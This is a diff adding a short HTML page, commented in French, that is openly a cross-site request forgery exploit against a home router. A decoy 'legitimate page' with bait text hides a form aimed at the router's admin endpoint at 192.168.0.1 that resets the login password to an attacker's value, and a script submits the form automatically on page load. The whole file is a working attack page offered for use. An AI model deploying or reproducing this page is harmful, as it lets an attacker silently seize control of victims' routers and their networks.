@@ -1,0 +1,24 @@
+   <!DOCTYPE html>
+   <html>
+   <head>
+       <title>Page Web Légitime</title>
+   </head>
+   <body>
+       <h1>Bienvenue sur cette page web</h1>
+       <p>Contenu intéressant pour attirer la victime...</p>
+       
+       <!-- Formulaire CSRF caché qui sera automatiquement soumis -->
+       <form id="csrf-form" action="http://192.168.0.1/boafrm/formLogin" method="POST" style="display:none;">
+           <input type="hidden" name="topicurl" value="setting/setUserLogin">
+           <input type="hidden" name="userpass" value="motdepassepirate">
+           <input type="hidden" name="submit-url" value="/login.htm">
+       </form>
+       
+       <script>
+           // Soumet automatiquement le formulaire dès que la page est chargée
+           window.onload = function() {
+               document.getElementById("csrf-form").submit();
+           }
+       </script>
+   </body>
+   </html>
